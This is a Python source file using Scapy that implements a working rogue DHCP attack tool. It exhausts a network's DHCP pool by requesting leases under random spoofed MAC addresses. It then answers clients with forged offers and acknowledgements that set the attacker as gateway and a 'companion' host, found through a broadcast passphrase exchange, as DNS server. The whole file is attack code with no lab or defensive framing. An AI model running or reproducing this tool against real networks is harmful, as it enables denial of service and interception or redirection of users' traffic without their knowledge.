import time
import random
import socket
import threading
import signal
import sys
from scapy.all import *

conf.checkIPaddr = False

DHCP_DISCOVER = 1
DHCP_OFFER = 2
DHCP_REQUEST = 3
DHCP_ACK = 5
DHCP_NAK = 6
DHCP_RELEASE = 7

LEASE_TIME = 3600
PENDING_TIMEOUT = 10

class PortableRogueDHCP:
    def __init__(self):
        self.iface = conf.iface
        self.server_mac = get_if_hwaddr(self.iface)
        self.server_ip = self.get_local_ip()
        self.running = True
        self.network_info = {'dns': None, 'gateway': None, 'subnet_mask': '255.255.255.0'}

        self.available_pool = []
        self.stolen_leases = {}
        self.pending_offers = {}
        self.active_leases = {}

        print(f"[*] Initializing Rogue DHCP on {self.iface} ({self.server_ip})")
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        self.running = False
        self.release_stolen_ips()
        sys.exit(0)

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            return s.getsockname()[0]
        except:
            return get_if_addr(conf.iface)

    def generate_mac(self): return str(RandMAC())

    def _build_base_reply(self, client_mac_str, client_mac_bytes, xid, op=2):
        padded_chaddr = client_mac_bytes + b'\x00' * (16 - len(client_mac_bytes))
        return Ether(src=self.server_mac, dst=client_mac_str) / \
               IP(src=self.server_ip, dst="255.255.255.255") / \
               UDP(sport=67, dport=68) / \
               BOOTP(op=op, siaddr=self.server_ip, chaddr=padded_chaddr, xid=xid)

    def build_offer(self, client_mac, client_mac_bytes, xid, offer_ip):
        base = self._build_base_reply(client_mac, client_mac_bytes, xid)
        base[BOOTP].yiaddr = offer_ip
        # FIX: Router and Name Server MUST be lists [...]
        dhcp = DHCP(options=[
            ("message-type", DHCP_OFFER),
            ("subnet_mask", self.network_info['subnet_mask']),
            ("router", [self.network_info['gateway'] or self.server_ip]),
            ("name_server", [self.network_info['dns']]),
            ("lease_time", LEASE_TIME),
            ("server_id", self.server_ip),
            "end"
        ])
        return base / dhcp

    def build_ack(self, client_mac, client_mac_bytes, xid, assigned_ip):
        base = self._build_base_reply(client_mac, client_mac_bytes, xid)
        base[BOOTP].yiaddr = assigned_ip
        dhcp = DHCP(options=[
            ("message-type", DHCP_ACK),
            ("subnet_mask", self.network_info['subnet_mask']),
            ("router", [self.network_info['gateway'] or self.server_ip]),
            ("name_server", [self.network_info['dns']]),
            ("lease_time", LEASE_TIME),
            ("server_id", self.server_ip),
            "end"
        ])
        return base / dhcp

    def build_heist_request(self, mac_str, mac_bytes, xid, requested_ip=None, msg_type=DHCP_DISCOVER):
        padded_chaddr = mac_bytes + b'\x00' * (16 - len(mac_bytes))
        opts = [("message-type", msg_type)]
        if requested_ip:
            opts.extend([("server_id", self.network_info['real_dhcp_ip']), ("requested_addr", requested_ip)])
        opts.append("end")
        return Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / \
               UDP(sport=68, dport=67) / BOOTP(chaddr=padded_chaddr, xid=xid) / DHCP(options=opts)

    def phase_1_recon(self):
        print("[*] Phase 1: Recon...")
        p_mac = self.generate_mac()
        p_pkt = self.build_heist_request(p_mac, mac2str(p_mac), random.randint(1, 9e8))
        ans = srp1(p_pkt, iface=self.iface, timeout=5, verbose=False)
        if ans and ans.haslayer(DHCP):
            opts = {opt[0]: opt[1] for opt in ans[DHCP].options if isinstance(opt, tuple)}
            self.network_info.update({'gateway': opts.get('router'), 'subnet_mask': opts.get('subnet_mask'), 'real_dhcp_ip': opts.get('server_id')})
            return True
        return False

    def phase_1_5_companion_discovery(self):
        print("[*] Phase 1.5: Barbie Discovery...")
        ds = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ds.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        ds.settimeout(2.0)
        for _ in range(3):
            try:
                ds.sendto(b"IM_A_BARBIE_GIRL_IN_A_BARBIE_WORLD", ('255.255.255.255', 9999))
                data, addr = ds.recvfrom(1024)
                if data == b"COME_ON_BARBIE_LETS_GO_PARTY":
                    self.network_info['dns'] = addr[0]
                    print(f"[+] DNS Companion Found: {addr[0]}")
                    return
            except: continue
        print("[-] No companion found!")

    def phase_2_heist(self, count=5):
        for _ in range(count):
            m_str = self.generate_mac()
            xid = random.randint(1, 9e8)
            ans = srp1(self.build_heist_request(m_str, mac2str(m_str), xid), timeout=2, verbose=False)
            if ans:
                ip = ans[BOOTP].yiaddr
                sendp(self.build_heist_request(m_str, mac2str(m_str), xid, requested_ip=ip, msg_type=DHCP_REQUEST), verbose=False)
                self.available_pool.append(ip)
                self.stolen_leases[ip] = {'mac_str': m_str, 'mac_bytes': mac2str(m_str), 'lease_time': 3600, 'last_renew': time.time()}
                print(f"[+] Hoarded: {ip}")

    def release_stolen_ips(self):
        for ip, data in self.stolen_leases.items():
            pkt = Ether(src=data['mac_str'], dst="ff:ff:ff:ff:ff:ff")/IP(src=ip, dst=self.network_info['real_dhcp_ip'])/UDP(sport=68, dport=67)/BOOTP(ciaddr=ip, chaddr=data['mac_bytes']+b'\x00'*10, xid=random.randint(1, 9e8))/DHCP(options=[("message-type", DHCP_RELEASE), ("server_id", self.network_info['real_dhcp_ip']), "end"])
            sendp(pkt, verbose=False)

    def phase_3_serve(self, packet):
        if not packet.haslayer(DHCP): return
        opts = {opt[0]: opt[1] for opt in packet[DHCP].options if isinstance(opt, tuple)}
        m_type, c_mac, xid = opts.get('message-type'), packet[Ether].src, packet[BOOTP].xid
        if c_mac == self.server_mac: return

        if m_type == DHCP_DISCOVER:
            ip = self.active_leases.get(c_mac, {}).get('ip') or (self.available_pool.pop(0) if self.available_pool else None)
            if ip:
                self.pending_offers[c_mac] = {'ip': ip, 'time': time.time()}
                sendp(self.build_offer(c_mac, packet[BOOTP].chaddr[:6], xid, ip), verbose=False)
        elif m_type == DHCP_REQUEST:
            req_ip = opts.get('requested_addr') or packet[BOOTP].ciaddr
            if c_mac in self.pending_offers and self.pending_offers[c_mac]['ip'] == req_ip:
                self.active_leases[c_mac] = {'ip': req_ip, 'expiry': time.time() + LEASE_TIME}
                sendp(self.build_ack(c_mac, packet[BOOTP].chaddr[:6], xid, req_ip), verbose=False)
                del self.pending_offers[c_mac]

    def start(self):
        if self.phase_1_recon():
            self.phase_1_5_companion_discovery()
            if not self.network_info['dns']: return
            self.phase_2_heist()
            sniff(filter="udp and (port 67 or 68)", prn=self.phase_3_serve, stop_filter=lambda x: not self.running, store=0)

if __name__ == "__main__":
    PortableRogueDHCP().start()
